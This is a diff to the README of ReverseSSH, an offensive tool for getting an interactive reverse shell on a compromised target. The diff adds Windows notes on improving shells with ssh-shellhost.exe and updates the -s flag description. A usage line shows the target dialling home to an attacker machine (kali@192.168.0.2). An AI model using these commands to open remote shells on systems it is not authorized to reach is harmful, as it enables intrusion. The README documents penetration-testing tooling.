@@ -17,10 +17,18 @@ Instead you can go the way to simply deploy a **lightweight ssh server** (<1.5MB
 ReverseSSH tries to bridge the gap between initial foothold on a target and full local privilege escalation.
 Its main strengths are the following:
 
-* **Fully interactive shell access** (A fully interactive powershell on windows relies on the [Windows Pseudo Console ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and thus requires at least `Win10 Build 17763`. Before that, it still works, but you only get a somewhat interactive, generic reverse shell.)
+* **Fully interactive shell access**  (check windows caveats below)
 * **File transfer via sftp**
 * **Local / remote / dynamic port forwarding**
 * Supports **Unix** and **Windows** operating systems
+
+**Windows caveats**
+
+A fully interactive powershell on windows relies on [Windows Pseudo Console ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and thus requires at least `Win10 Build 17763`.
+On earlier versions it still works, but you only get a somewhat interactive, generic reverse shell.
+
+You can still improve it for older windows versions by dropping [`ssh-shellhost.exe` from OpenSSH for Windows](https://github.com/PowerShell/Win32-OpenSSH/releases/latest) in the same directory as `reverse-ssh` and then use flag `-s ssh-shellhost.exe`.
+This will pipe all traffic through `ssh-shellhost.exe`, which mimics a pty and transforms all virtual terminal codes such that windows can understand.
 
 
 ## Requirements
@@ -54,7 +62,9 @@ Examples:
         reverse-ssh -v -b 0 kali@192.168.0.2
 
 Options:
-        -s, Shell to use for incoming connections, e.g. /bin/bash; no effect for windows (default: /bin/bash)
+        -s, Shell to use for incoming connections, e.g. /bin/bash; (default: /bin/bash)
+                for windows this can only be used to give a path to 'ssh-shellhost.exe' to
+                enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
         -l, Bind scenario only: listen at this address:port (default: :31337)
         -p, Reverse scenario only: ssh port at home (default: 22)
         -b, Reverse scenario only: bind to this port after dialling home (default: 8888)
